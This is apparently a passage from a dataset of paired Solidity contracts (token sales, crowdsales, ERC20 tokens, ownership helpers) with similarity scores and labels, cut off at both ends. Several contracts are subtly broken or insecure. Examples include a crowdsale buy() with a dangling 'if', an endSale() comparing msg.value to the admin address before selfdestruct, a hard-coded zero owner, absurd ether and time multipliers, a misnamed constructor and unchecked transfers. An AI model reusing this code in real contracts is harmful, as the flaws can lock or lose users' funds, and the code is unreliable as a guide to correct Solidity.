function max256(uint256 a, uint256 b) internal constant returns 
(uint256) {
    return a >= b ? a : b;
}

function min256(uint256 a, uint256 b) internal constant returns 
(uint256) {
    return a < b ? a : b;
}


function assert(bool assertion) internal {
    if (!assertion) {
        throw;
    }
}
 }",0.995639643,"contract SafeMath {
  function safeMul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function safeDiv(uint a, uint b) internal returns (uint) {
    assert(b > 0);
    uint c = a / b;
    assert(a == b * c + a % b);
    return c;
  }

  function safeSub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
  }

  function safeAdd(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c>=a && c>=b);
    return c;
  }

  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }

  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }

  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }

  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }

  function assert(bool assertion) internal {
    if (!assertion) {
      throw;
    }
  }
}",1,,,,,
"contract Ownable {
   address public owner =0x00000;


   
   function Ownable() {
     owner = msg.sender;
   }


   
   modifier onlyOwner() {
     require(msg.sender == owner);
_;
   }


   
   function transferOwnership(address newOwner) onlyOwner {
     require(newOwner != address(0));      
     owner = newOwner;
   }

 }",0.914153528,"contract Ownable {

  address public owner;





  

  function Ownable() public {

    owner = msg.sender;

  }





  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }





  

  function transferOwnership(address newOwner) public onlyOwner {

    if (newOwner != address(0)) {

      owner = newOwner;

    }

  }



}",2,,,,,
"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward; 
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;
    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 10000 ether;
        deadline = now + durationInMinutes * 20160 minutes;
        price = etherCostOfEachToken * 0.1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function buy() public payable {
        if(!crowdsaleClosed)
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.mintToken(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.96866353,"contract Crowdsale {

    address public beneficiary;  

    uint public fundingGoal;   

    uint public amountRaised;   

    uint public deadline;      



    uint public price;    

    token public tokenReward;   



    mapping(address => uint256) public balanceOf;



    bool fundingGoalReached = false;  

    bool crowdsaleClosed = false;   



    

    event GoalReached(address recipient, uint totalAmountRaised);

    event FundTransfer(address backer, uint amount, bool isContribution);



    

    function Crowdsale(

        address ifSuccessfulSendTo,

        uint fundingGoalInEthers,

        uint durationInMinutes,

        uint finneyCostOfEachToken,

        address addressOfTokenUsedAsReward) {

            beneficiary = ifSuccessfulSendTo;

            fundingGoal = fundingGoalInEthers * 1 ether;

            deadline = now + durationInMinutes * 1 minutes;

            price = finneyCostOfEachToken * 1 finney;

            tokenReward = token(addressOfTokenUsedAsReward);   

    }



    

    function () payable {

      require(!crowdsaleClosed);

      uint amount = msg.value;

      balanceOf[msg.sender] += amount;

      amountRaised += amount;

      tokenReward.transfer(msg.sender, amount / price);

      FundTransfer(msg.sender, amount, true);

    

        

      beneficiary.send(amount);

    }



    

    modifier afterDeadline() { if (now >= deadline) _; }



    

    function checkGoalReached() afterDeadline {

        if (amountRaised >= fundingGoal) {

            fundingGoalReached = true;

            GoalReached(beneficiary, amountRaised);

        }

        crowdsaleClosed = true;

    }





    

    function safeWithdrawal() afterDeadline {

        if (!fundingGoalReached) {

            uint amount = balanceOf[msg.sender];

            balanceOf[msg.sender] = 0;

            if (amount > 0) {

                if (msg.sender.send(amount)) {

                    FundTransfer(msg.sender, amount, false);

                } else {

                    balanceOf[msg.sender] = amount;

                }

            }

        }



        if (fundingGoalReached && beneficiary == msg.sender) {

            if (beneficiary.send(amountRaised)) {

                FundTransfer(beneficiary, amountRaised, false);

            } else {

                

                fundingGoalReached = false;

            }

        }

    }

}",1,,,,,
"contract DappTokenSale {
    address admin;
    DappToken public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

    constructor (DappToken _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice; 
    }

    function multiply (uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens (uint256 _numberOfTokens) public payable {
        require (msg.value == multiply(_numberOfTokens, tokenPrice));
        require (tokenContract.balanceOf(address(this)) >= _numberOfTokens);
        require (tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens;
        emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale () public {
        require (msg.value == admin);
        require (tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));
        selfdestruct(admin);
    }
}",0.912637814,"contract CoinByInsomniaTokenSale {
    address admin;
    CoinByInsomnia public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

   constructor (CoinByInsomnia _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(this) >= _numberOfTokens);
        require(tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens;

        emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
        require(msg.sender == admin);
        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));

        
        
        admin.transfer(address(this).balance);
    }
}",1,,,,,
"contract Ferrum {
    
    bytes32 public name;
    bytes32 public symbol;
    uint8 public decimals = 5;
    uint256 public totalSupply;
    uint256 public verID = 1.0;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    

    function TrainingToken(
    ) public {
        totalSupply = 15800000000000;                       
        balanceOf[msg.sender] = 15800000000000;             
        name = ""TrainingToken"";                                    
        symbol = ""TT"";                                     

    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferTEST(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value);           
        require(balanceOf[_to] + _value >= balanceOf[_to]); 
        balanceOf[msg.sender] -= _value;                    
        balanceOf[_to] += _value;                           
    }


    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }

}",0.922715076,"contract TokenERC20 {
    
    string public name=""Wuling Busy Mushroom Token"";
    string public symbol=""WBMT"";
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    
    event Burn(address indexed from, uint256 value);

    
    constructor() public {
        totalSupply = 1000000000 * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
       
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != address(0x0));
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, address(this), _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",2,,,,,
"contract DappToken {
    
    string public name = ""DappToken"";
    
    string public symbol = 'DAPP';
    
    string public standard = 'DApp Token v1.0';
    uint256 public totalSupply;

    event Transfer(
        address indexed _form,
        address indexed _to,
        uint256 _value
        );

    event Approval(
            address indexed _owner,
            address indexed _spender,
            uint256 _value
        );


    mapping(address => uint256) public balanceOf;
    mapping(address => mapping (address => uint256)) public allowance;


    function DappToken (uint256 _intialSupply) public {
        balanceOf[msg.sender] = _intialSupply;
        totalSupply = _intialSupply;
        

    }   

    
    function transfer(address _to,uint256 _value) public returns (bool success){
    
    require (balanceOf[msg.sender] >= _value);
    
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value; 

    
    Transfer(msg.sender,_to,_value);

    
    return true;
    } 

    
    function approve(address _spender,uint256 _value) public returns (bool success){
        
        allowance[msg.sender][_spender] = _value;

        
        Approval(msg.sender,_spender,_value);


             return true;

    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        
        balanceOf[_from] -= _value;

        
       balanceOf[_to] += _value; 

       allowance[_from][msg.sender] -= _value;

       emit Transfer(_from,_to,_value);


        return true;
    }
}",0.936726575,"contract Token {
    string  public name = ""UDMZ"";
    string  public symbol = ""UDMZ"";
    uint256 public totalSupply;
    uint8   public decimals = 4;

    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _initialSupply) public {
        balanceOf[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
}",2,,,,,
"contract Crowdsale {
  using SafeMath for uint256;

   
  StandardToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
  }



function createTokenContract() internal returns (StandardToken) {
    return new TOKKA();
  }


  
  function () external payable {
    buyTokens(msg.sender);
  }

  
function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    
    ERC20(token).transfer(this, tokens);

    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
}


  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }


  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }


  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

}",0.940067804,"contract Crowdsale {
  using SafeMath for uint256;

  
  MintableToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  bool public isTesting;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    token = createTokenContract();
    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
  }

  
  
  function createTokenContract() internal returns (MintableToken) {
    return new MintableToken();
  }


  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);
  }

  
  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return (isTesting || withinPeriod) && nonZeroPurchase;
  }

  
  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

}",1,,,,,
"contract Owned {

    address owner;

    
    function owned() { owner = msg.sender; }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}",0.916936685,"contract Owned {
    address owner;

    modifier onlyowner() {
        if (msg.sender == owner) {
            _;
        }
    }

    function Owned() {
        owner = msg.sender;
    }
}",2,,,,,
"contract ERC20Interface {
    function transfer(address to, uint tokens) public returns (bool success);

}",0.903224928,"contract TransferInterfaceERC20 {
  function transfer(address to, uint tokens) public returns (bool success);
}",1,,,,,
"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    constructor(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable public {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
       emit FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() public afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                   emit FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
               emit FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.984882045,"contract Crowdsale {

    address public beneficiary;

    uint public fundingGoal;

    uint public amountRaised;

    uint public deadline;

    uint public price;

    token public tokenReward;

    mapping(address => uint256) public balanceOf;

    bool fundingGoalReached = false;

    bool crowdsaleClosed = false;



    event GoalReached(address recipient, uint totalAmountRaised);

    event FundTransfer(address backer, uint amount, bool isContribution);



    

    constructor(

        address ifSuccessfulSendTo,

        uint fundingGoalInEthers,

        uint durationInMinutes,

        uint etherCostOfEachToken,

        address addressOfTokenUsedAsReward

    ) public {

        beneficiary = ifSuccessfulSendTo;

        fundingGoal = fundingGoalInEthers * 1 ether;

        deadline = now + durationInMinutes * 1200 minutes;

        price = etherCostOfEachToken * 0.00001 ether;

        tokenReward = token(addressOfTokenUsedAsReward);

    }



    

    function () payable external {

        require(!crowdsaleClosed);

        uint amount = msg.value;

        balanceOf[msg.sender] += amount;

        amountRaised += amount;

        tokenReward.transfer(msg.sender, amount / price);

       emit FundTransfer(msg.sender, amount, true);

    }



    modifier afterDeadline() { if (now >= deadline) _; }



    

    function checkGoalReached() public afterDeadline {

        if (amountRaised >= fundingGoal){

            fundingGoalReached = true;

            emit GoalReached(beneficiary, amountRaised);

        }

        crowdsaleClosed = true;

    }





    

    function safeWithdrawal() public afterDeadline {

        if (!fundingGoalReached) {

            uint amount = balanceOf[msg.sender];

            balanceOf[msg.sender] = 0;

            if (amount > 0) {

                if (msg.sender.send(amount)) {

                   emit FundTransfer(msg.sender, amount, false);

                } else {

                    balanceOf[msg.sender] = amount;

                }

            }

        }



        if (fundingGoalReached && beneficiary == msg.sender) {

            if (msg.sender.send(amountRaised)) {

               emit FundTransfer(beneficiary, amountRaised, false);

            } else {

                

                fundingGoalReached = false;

            }

        }

    }

}",1,,,,,
"contract token { function transfer(address, uint256){  } }",0.930527386,"contract token { function transfer(address, uint){  } }",0,,,,,
"contract ERC20 {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}",0.987049176,"contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}",1,,,,,
"contract ERC20Interface {
    function totalSupply() public  view returns (uint);
    function balanceOf(address tokenOwner) public  view returns (uint);
    function allowance(address tokenOwner, address spender) public  view returns (uint);
    function transfer(address to, uint tokens) public  returns (bool );
    function approve(address spender, uint tokens) public  returns (bool );
    function transferFrom(address from, address to, uint tokens) public  returns (bool);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}",0.941373595,"contract ERC20Interface {
    
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}",1,,,,,
"contract WETH9_ {
string public name     = ""Wrapped Ether"";
string public symbol   = ""WETH"";
uint8  public decimals = 18;

event  Approval(address indexed src, address indexed guy, uint wad);
event  Transfer(address indexed src, address indexed dst, uint wad);
event  Deposit(address indexed dst, uint wad);
event  Withdrawal(address indexed src, uint wad);

mapping (address => uint)                       public  balanceOf;
mapping (address => mapping (address => uint))  public  allowance;

function() public payable {
    deposit();
}
function deposit() public payable {
    balanceOf[msg.sender] += msg.value;
    Deposit(msg.sender, msg.value);
}
function withdraw(uint wad) public {
    require(balanceOf[msg.sender] >= wad);
    balanceOf[msg.sender] -= wad;
    msg.sender.transfer(wad);
    Withdrawal(msg.sender, wad);
}

function totalSupply() public view returns (uint) {
    return this.balance;
}

function approve(address guy, uint wad) public returns (bool) {
    allowance[msg.sender][guy] = wad;
    Approval(msg.sender, guy, wad);
    return true;
}

function transfer(address dst, uint wad) public returns (bool) {
    return transferFrom(msg.sender, dst, wad);
}

function transferFrom(address src, address dst, uint wad)
    public
    returns (bool)
{
    require(balanceOf[src] >= wad);

    if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
        require(allowance[src][msg.sender] >= wad);
        allowance[src][msg.sender] -= wad;
    }

    balanceOf[src] -= wad;
    balanceOf[dst] += wad;

    Transfer(src, dst, wad);

    return true;
}",0.994646956,"contract WETH {
    string public name     = ""Wrapped Ether"";
    string public symbol   = ""WETH"";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdraw(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    function() public payable {
        deposit();
    }
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        Withdraw(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return this.balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad) 
        public 
        returns (bool) 
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        Transfer(src, dst, wad);

        return true;
    }
}",1,,,,,
"contract SimpleContract {
    uint storedData;
    function set(uint x) public { storedData = x; }
    function get() public returns (uint) { return storedData; }
}",0.917644096,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}",1,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 10;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",0.989682146,"contract CCPLUS {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function CCPLUS(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
